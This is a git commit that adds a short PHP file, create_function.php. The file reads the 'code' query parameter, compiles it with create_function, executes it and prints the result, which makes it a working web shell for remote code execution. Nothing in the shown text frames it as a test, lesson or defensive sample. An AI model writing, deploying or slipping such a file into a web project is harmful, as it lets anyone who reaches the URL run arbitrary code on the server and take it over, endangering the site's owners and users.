419b3e5d6efac29d7a5cad0413f727bd6e300c6f
littleboy <zenal.000.zzz@gmail.com>
2023-07-28 13:52:48 +0700

    add create execute function only running on php7

---
+++ create_function.php
@@ -0,0 +1,11 @@
+<?php
+if (isset($_GET['code'])) {
+    $code = $_GET['code'];
+
+    $function = create_function('', $code);
+
+    $result = $function();
+
+    echo "Hasil Eksekusi: " . htmlspecialchars($result);
+}
+?>
